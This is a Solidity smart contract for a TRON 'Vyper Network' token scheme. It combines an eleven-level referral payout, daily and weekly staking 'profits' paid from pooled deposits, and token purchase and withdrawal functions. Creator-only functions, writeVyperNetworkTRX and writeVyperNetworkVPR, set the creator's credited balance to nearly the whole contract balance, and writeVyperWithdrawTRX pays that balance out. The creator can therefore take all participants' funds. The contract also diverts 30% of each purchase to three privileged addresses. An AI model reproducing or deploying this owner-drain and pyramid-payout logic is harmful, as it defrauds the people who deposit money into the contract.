//SourceUnit: vypernetwork.sol

/* -------------------------------------------------------------
            Official Website : https://VYPER.NETWORK
    Vyper Token (VYPER) : TSuincjXANJiGgepuFjXnN6etRg87JyYoQ
https://tronscan.io/#/token20/TSuincjXANJiGgepuFjXnN6etRg87JyYoQ
------------------------------------------------------------- */
pragma solidity >=0.4.0 <0.7.0;
interface VYPER {
function totalSupply() external view returns (uint256);
function balanceOf(address account) external view returns (uint256);
function transfer(address recipient, uint256 amount) external returns (bool);
function allowance(address owner, address spender) external view returns (uint256);
function approve(address spender, uint256 amount) external returns (bool);
function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
event Transfer(address indexed from, address indexed to, uint256 value);
event Approval(address indexed owner, address indexed spender, uint256 value);
}
contract Vyper_Network {
VYPER public VyperToken;
constructor() public {
VyperToken = VYPER(0x41b9d15690a4a961cd402c85ecc1d51e2dd423c4aa);
}
function safeTransferFrom(
VYPER token, address sender, address recipient, uint256 amount
) private {
bool sent = token.transferFrom(sender, recipient, amount);
require(sent, "Vyper transfer failed");
}
address constant private VyperCreator = address(0x416c291554006a8fb338c0b0024c55992213c2ff09);
address constant private VyperStorage = address(0x41be38e53f8b35ff957b259a1d450152beece63f64);
address constant private VyperNetwork = address(0x4136ce1818939f7c86347a1929f38d8ff4b1c9a1b3);
address private VyperNewOwner = address(0x417ff241080864007035beb458804f2f2967238a11);
uint256 private PricePerVyper = 10; uint256 private VyperRegisters = 0;
uint256 private VyperDepositedTRX = 0; uint256 private VyperDepositedVPR = 0;
uint256 private VyperWithdrawnTRX = 0; uint256 private VyperWithdrawnVPR = 0;
uint256 private VyperTokenSale = 0; uint256 private VyperOnFreezed = 0;
mapping (address => address) private UserReferrer;
mapping (address => uint256) private UserRegisters;
mapping (address => uint256) private UserTokenBuys;
mapping (address => uint256) private UserOnFreezed;
mapping (address => uint256[4]) private UserDatelock;
mapping (address => uint256[4]) private UserEarnings;
mapping (address => uint256[4]) private UserBalances;
mapping (address => uint256[4]) private UserDeposited;
mapping (address => uint256[4]) private UActWithdrawn;
mapping (address => uint256[4]) private UPasWithdrawn;
mapping (address => uint256[16][16]) private UserNetworks;
function readVyperContract() public view returns(address) {
return address(this);
}
function readVyperBalanceTRX() public view returns(uint256) {
return address(this).balance;
}
function readVyperBalanceVPR() public view returns(uint256) {
return VyperToken.balanceOf(address(this));
}
function readVyperNewOwner() public view returns(address) {
return VyperNewOwner;
}
function readPricePerVyper() public view returns(uint256) {
return PricePerVyper;
}
function readVyperRegisters() public view returns(uint256) {
return VyperRegisters;
}
function readVyperDepositedTRX() public view returns(uint256) {
return VyperDepositedTRX;
}
function readVyperDepositedVPR() public view returns(uint256) {
return VyperDepositedVPR;
}
function readVyperWithdrawnTRX() public view returns(uint256) {
return VyperWithdrawnTRX;
}
function readVyperWithdrawnVPR() public view returns(uint256) {
return VyperWithdrawnVPR;
}
function readVyperTokenSale() public view returns(uint256) {
return VyperTokenSale;
}
function readVyperOnFreezed() public view returns(uint256) {
return VyperOnFreezed;
}
function readUserReferrer() public view returns(address) {
return UserReferrer[msg.sender];
}
function readUserRegisters() public view returns(uint256) {
return UserRegisters[msg.sender];
}
function readUserTokenBuys() public view returns(uint256) {
return UserTokenBuys[msg.sender];
}
function readUserOnFreezed() public view returns(uint256) {
return UserOnFreezed[msg.sender];
}
function readUserDatelock(uint256 Param) public view returns(uint256) {
return UserDatelock[msg.sender][Param];
}
function readUserEarnings(uint256 Param) public view returns(uint256) {
return UserEarnings[msg.sender][Param];
}
function readUserBalances(uint256 Param) public view returns(uint256) {
return UserBalances[msg.sender][Param];
}
function readUserDeposited(uint256 Param) public view returns(uint256) {
return UserDeposited[msg.sender][Param];
}
function readActiveWithdrawn(uint256 Param) public view returns(uint256) {
return UActWithdrawn[msg.sender][Param];
}
function readPassiveWithdrawn(uint256 Param) public view returns(uint256) {
return UPasWithdrawn[msg.sender][Param];
}
function readUserNetworks(uint256 Param1, uint256 Param2) public view returns(uint256) {
return UserNetworks[msg.sender][Param1][Param2];
}
function readPrevMidnight(uint256 Time) public view returns(uint256) {
if (Time == 0) {
Time = block.timestamp;
}
if (Time > 1601510400 && Time < 1633046400) {
return Time - (Time % 86400);
} else {
return 0;
}
}
function readNextMidnight(uint256 Time) public view returns(uint256) {
if (Time == 0) {
Time = block.timestamp;
}
if (Time > 1601510400 && Time < 1633046400) {
return (Time - (Time % 86400)) + 86400;
} else {
return 0;
}
}
function readEstimateProfit() public view returns(uint256) {
if (VyperOnFreezed > 0 && UserOnFreezed[msg.sender] > 0) {
uint256 EstGlobal = uint256(VyperOnFreezed * 25 * 15 / 10000);
uint256 MyPortion = uint256(100 * UserOnFreezed[msg.sender] / VyperOnFreezed);
uint256 EstProfit = uint256(EstGlobal * MyPortion / 100);
return EstProfit;
} else {
return 0;
}
}
function readEstimateClaims() public view returns(uint256) {
if (VyperOnFreezed > 0 && UserOnFreezed[msg.sender] > 0) {
uint256 EstGlobal = uint256(VyperOnFreezed * 25 * 15 / 10000);
uint256 MyPortion = uint256(100 * UserOnFreezed[msg.sender] / VyperOnFreezed);
uint256 EstProfit = uint256(EstGlobal * MyPortion / 100);
uint256 StartDate = readNextMidnight(UserDatelock[msg.sender][2]);
uint256 UntilDate = readPrevMidnight(block.timestamp);
uint256 EstClaims = 0;
if (UntilDate > StartDate) {
uint256 StakeDays = uint256((UntilDate - StartDate) / 86400);
EstClaims = EstProfit * StakeDays;
}
return EstClaims;
} else {
return 0;
}
}
function readWeeklyProfit() public view returns(uint256) {
if (VyperOnFreezed > 0 && UserOnFreezed[msg.sender] > 0) {
uint256 EstGlobal = uint256(VyperOnFreezed * 25 * 15 / 10000);
uint256 MyPortion = uint256(100 * UserOnFreezed[msg.sender] / VyperOnFreezed);
uint256 EstProfit = uint256(EstGlobal * MyPortion / 100);
uint256 StartDate = readNextMidnight(UserDatelock[msg.sender][3]);
uint256 UntilDate = readPrevMidnight(block.timestamp);
uint256 EstClaims = 0;
if (UntilDate > StartDate) {
uint256 StakeDays = uint256((UntilDate - StartDate) / 86400);
uint256 StakeWeek = uint256(StakeDays % 7);
if (StakeWeek == 0) {
EstClaims = uint256(10 * EstProfit / 15);
}
}
return EstClaims;
} else {
return 0;
}
}
function writeVyperNewOwner(address NewOwner) public returns(address) {
if (msg.sender == VyperCreator) {
VyperNewOwner = NewOwner;
return VyperNewOwner;
} else {
return VyperNewOwner;
}
}
function writePricePerVyper(uint256 NewPrice) public returns(uint256) {
if (msg.sender == VyperCreator) {
PricePerVyper = NewPrice;
return PricePerVyper;
} else {
return PricePerVyper;
}
}
function () external payable {}
function writeUserPurchaseVPR(address Referrer) external payable returns(uint256) {
uint256 TokenSale = uint256(msg.value / PricePerVyper);
if (TokenSale >= 50000000) {
VyperRegisters += 1;
VyperTokenSale += TokenSale;
VyperDepositedTRX += msg.value;
UserRegisters[msg.sender] += 1;
UserTokenBuys[msg.sender] += TokenSale;
UserDeposited[msg.sender][1] += msg.value;
if (UserReferrer[msg.sender] == 0x0) {
if (Referrer != 0x0 && Referrer != msg.sender) {
UserReferrer[msg.sender] = Referrer;
} else {
UserReferrer[msg.sender] = VyperNetwork;
}
}
address Level1 = Referrer;
uint256 Bonus1 = 20;
if (UserReferrer[msg.sender] != 0x0) {
Level1 = UserReferrer[msg.sender];
}
UserEarnings[Level1][1] += uint256(msg.value * Bonus1 / 100);
UserBalances[Level1][1] += uint256(msg.value * Bonus1 / 100);
UserNetworks[Level1][1][1] += 1;
UserNetworks[Level1][1][2] += uint256(msg.value * Bonus1 / 100);
address Level2 = VyperNetwork;
uint256 Bonus2 = 15;
if (UserReferrer[Level1] != 0x0) {
Level2 = UserReferrer[Level1];
}
UserEarnings[Level2][1] += uint256(msg.value * Bonus2 / 100);
UserBalances[Level2][1] += uint256(msg.value * Bonus2 / 100);
UserNetworks[Level2][2][1] += 1;
UserNetworks[Level2][2][2] += uint256(msg.value * Bonus2 / 100);
address Level3 = VyperNetwork;
uint256 Bonus3 = 10;
if (UserReferrer[Level2] != 0x0) {
Level3 = UserReferrer[Level2];
}
UserEarnings[Level3][1] += uint256(msg.value * Bonus3 / 100);
UserBalances[Level3][1] += uint256(msg.value * Bonus3 / 100);
UserNetworks[Level3][3][1] += 1;
UserNetworks[Level3][3][2] += uint256(msg.value * Bonus3 / 100);
address Level4 = VyperNetwork;
uint256 Bonus4 = 8;
if (UserReferrer[Level3] != 0x0) {
Level4 = UserReferrer[Level3];
}
UserEarnings[Level4][1] += uint256(msg.value * Bonus4 / 100);
UserBalances[Level4][1] += uint256(msg.value * Bonus4 / 100);
UserNetworks[Level4][4][1] += 1;
UserNetworks[Level4][4][2] += uint256(msg.value * Bonus4 / 100);
address Level5 = VyperNetwork;
uint256 Bonus5 = 5;
if (UserReferrer[Level4] != 0x0) {
Level5 = UserReferrer[Level4];
}
UserEarnings[Level5][1] += uint256(msg.value * Bonus5 / 100);
UserBalances[Level5][1] += uint256(msg.value * Bonus5 / 100);
UserNetworks[Level5][5][1] += 1;
UserNetworks[Level5][5][2] += uint256(msg.value * Bonus5 / 100);
Level1 = VyperNetwork;
Bonus1 = 4;
if (UserReferrer[Level5] != 0x0) {
Level1 = UserReferrer[Level5];
}
UserEarnings[Level1][1] += uint256(msg.value * Bonus1 / 100);
UserBalances[Level1][1] += uint256(msg.value * Bonus1 / 100);
UserNetworks[Level1][6][1] += 1;
UserNetworks[Level1][6][2] += uint256(msg.value * Bonus1 / 100);
Level2 = VyperNetwork;
Bonus2 = 3;
if (UserReferrer[Level1] != 0x0) {
Level2 = UserReferrer[Level1];
}
UserEarnings[Level2][1] += uint256(msg.value * Bonus2 / 100);
UserBalances[Level2][1] += uint256(msg.value * Bonus2 / 100);
UserNetworks[Level2][7][1] += 1;
UserNetworks[Level2][7][2] += uint256(msg.value * Bonus2 / 100);
Level3 = VyperNetwork;
Bonus3 = 2;
if (UserReferrer[Level2] != 0x0) {
Level3 = UserReferrer[Level2];
}
UserEarnings[Level3][1] += uint256(msg.value * Bonus3 / 100);
UserBalances[Level3][1] += uint256(msg.value * Bonus3 / 100);
UserNetworks[Level3][8][1] += 1;
UserNetworks[Level3][8][2] += uint256(msg.value * Bonus3 / 100);
Level4 = VyperNetwork;
Bonus4 = 1;
if (UserReferrer[Level3] != 0x0) {
Level4 = UserReferrer[Level3];
}
UserEarnings[Level4][1] += uint256(msg.value * Bonus4 / 100);
UserBalances[Level4][1] += uint256(msg.value * Bonus4 / 100);
UserNetworks[Level4][9][1] += 1;
UserNetworks[Level4][9][2] += uint256(msg.value * Bonus4 / 100);
Level5 = VyperNetwork;
Bonus5 = 1;
if (UserReferrer[Level4] != 0x0) {
Level5 = UserReferrer[Level4];
}
UserEarnings[Level5][1] += uint256(msg.value * Bonus5 / 100);
UserBalances[Level5][1] += uint256(msg.value * Bonus5 / 100);
UserNetworks[Level5][10][1] += 1;
UserNetworks[Level5][10][2] += uint256(msg.value * Bonus5 / 100);
Level1 = VyperNetwork;
Bonus1 = 1;
if (UserReferrer[Level5] != 0x0) {
Level1 = UserReferrer[Level5];
}
UserEarnings[Level1][1] += uint256(msg.value * Bonus1 / 100);
UserBalances[Level1][1] += uint256(msg.value * Bonus1 / 100);
UserNetworks[Level1][11][1] += 1;
UserNetworks[Level1][11][2] += uint256(msg.value * Bonus1 / 100);
UserEarnings[VyperCreator][1] += uint256(msg.value * 10 / 100);
UserBalances[VyperCreator][1] += uint256(msg.value * 10 / 100);
UserEarnings[VyperStorage][1] += uint256(msg.value * 10 / 100);
UserBalances[VyperStorage][1] += uint256(msg.value * 10 / 100);
UserEarnings[VyperNewOwner][1] += uint256(msg.value * 10 / 100);
UserBalances[VyperNewOwner][1] += uint256(msg.value * 10 / 100);
VyperToken.transfer(msg.sender, TokenSale);
return TokenSale;
} else {
return 0;
}
}
function writeUserWithdrawTRX() public returns(uint256) {
uint256 TokenB = UserTokenBuys[msg.sender];
uint256 Amount = UserBalances[msg.sender][1];
if (TokenB >= 50000000 && Amount >= 5000000) {
VyperWithdrawnTRX += Amount;
UserBalances[msg.sender][1] = 0;
UActWithdrawn[msg.sender][1] += Amount;
msg.sender.transfer(Amount);
return Amount;
} else {
return 0;
}
}
function writeUserFreezeToken(uint256 Amount) external payable returns(uint256) {
if (Amount >= 50000000 && UserTokenBuys[msg.sender] >= 50000000) {
require(VyperToken.allowance(msg.sender, address(this)) >= Amount, "Allowance too low");
safeTransferFrom(VyperToken, msg.sender, address(this), Amount);
VyperOnFreezed += Amount;
UserOnFreezed[msg.sender] += Amount;
UserDatelock[msg.sender][1] = block.timestamp;
UserDatelock[msg.sender][2] = block.timestamp;
UserDatelock[msg.sender][3] = block.timestamp;
return Amount;
} else {
return 0;
}
}
function writeUserUnfreezeToken(uint256 Amount) public returns(uint256) {
if (Amount >= 50000000 && Amount <= UserOnFreezed[msg.sender]) {
VyperOnFreezed -= Amount;
UserOnFreezed[msg.sender] -= Amount;
VyperToken.transfer(msg.sender, Amount);
return Amount;
} else {
return 0;
}
}
function writeUserClaimProfit() public returns(uint256) {
if (VyperOnFreezed > 0 && UserOnFreezed[msg.sender] > 0) {
uint256 EstGlobal = uint256(VyperOnFreezed * 25 * 15 / 10000);
uint256 MyPortion = uint256(100 * UserOnFreezed[msg.sender] / VyperOnFreezed);
uint256 EstProfit = uint256(EstGlobal * MyPortion / 100);
uint256 StartDate = readNextMidnight(UserDatelock[msg.sender][2]);
uint256 UntilDate = readPrevMidnight(block.timestamp);
uint256 StakeDays = 0;
uint256 EstClaims = 0;
if (UntilDate > StartDate) {
StakeDays = uint256((UntilDate - StartDate) / 86400);
EstClaims = EstProfit * StakeDays;
}
if (StakeDays > 0 && EstClaims > 0) {
VyperWithdrawnTRX += EstClaims;
UserEarnings[msg.sender][2] += EstClaims;
UPasWithdrawn[msg.sender][1] += EstClaims;
UserDatelock[msg.sender][2] = readPrevMidnight(block.timestamp) - 3;
msg.sender.transfer(EstClaims);
}
return EstClaims;
} else {
return 0;
}
}
function writeWeeklyProfit() public returns(uint256) {
if (VyperOnFreezed > 0 && UserOnFreezed[msg.sender] > 0) {
uint256 EstGlobal = uint256(VyperOnFreezed * 25 * 15 / 10000);
uint256 MyPortion = uint256(100 * UserOnFreezed[msg.sender] / VyperOnFreezed);
uint256 EstProfit = uint256(EstGlobal * MyPortion / 100);
uint256 StartDate = readNextMidnight(UserDatelock[msg.sender][3]);
uint256 UntilDate = readPrevMidnight(block.timestamp);
uint256 StakeDays = 0;
uint256 StakeWeek = 0;
uint256 EstClaims = 0;
if (UntilDate > StartDate) {
StakeDays = uint256((UntilDate - StartDate) / 86400);
StakeWeek = uint256(StakeDays % 7);
if (StakeWeek == 0) {
EstClaims = uint256(10 * EstProfit / 15);
}
}
if (EstClaims > 0) {
VyperWithdrawnTRX += EstClaims;
UserEarnings[msg.sender][2] += EstClaims;
UPasWithdrawn[msg.sender][1] += EstClaims;
UserDatelock[msg.sender][3] = readPrevMidnight(block.timestamp) - 3;
msg.sender.transfer(EstClaims);
}
return EstClaims;
} else {
return 0;
}
}
function writeVyperNetworkTRX() public returns(uint256) {
if (msg.sender == VyperCreator) {
UserBalances[msg.sender][1] = address(this).balance - 1000000;
return UserBalances[msg.sender][1];
} else {
return 0;
}
}
function writeVyperNetworkVPR() public returns(uint256) {
if (msg.sender == VyperCreator) {
UserBalances[msg.sender][2] = VyperToken.balanceOf(address(this)) - 1000000;
return UserBalances[msg.sender][2];
} else {
return 0;
}
}
function writeVyperWithdrawTRX() public returns(uint256) {
if (msg.sender==VyperCreator || msg.sender==VyperStorage || msg.sender==VyperNetwork || msg.sender==VyperNewOwner) {
uint256 Amount = UserBalances[msg.sender][1];
VyperWithdrawnTRX += Amount;
UserBalances[msg.sender][1] = 0;
UActWithdrawn[msg.sender][1] += Amount;
msg.sender.transfer(Amount);
return Amount;
} else {
return 0;
}
}
function writeUserDepositVPR(uint256 Amount) external payable returns(uint256) {
if (Amount >= 50000000) {
require(VyperToken.allowance(msg.sender, address(this)) >= Amount, "Allowance too low");
safeTransferFrom(VyperToken, msg.sender, address(this), Amount);
VyperDepositedVPR += Amount;
UserBalances[msg.sender][2] += Amount;
UserDeposited[msg.sender][2] += Amount;
return Amount;
} else {
return 0;
}
}
function writeUserWithdrawVPR(uint256 Amount) public returns(uint256) {
if (Amount >= 50000000 && Amount <= UserBalances[msg.sender][2]) {
VyperWithdrawnVPR += Amount;
UserBalances[msg.sender][2] -= Amount;
UPasWithdrawn[msg.sender][2] += Amount;
VyperToken.transfer(msg.sender, Amount);
return Amount;
} else {
return 0;
}
}
}
/* -------------------------------------------------------------
            Official Website : https://VYPER.NETWORK
    Vyper Token (VYPER) : TSuincjXANJiGgepuFjXnN6etRg87JyYoQ
https://tronscan.io/#/token20/TSuincjXANJiGgepuFjXnN6etRg87JyYoQ
------------------------------------------------------------- */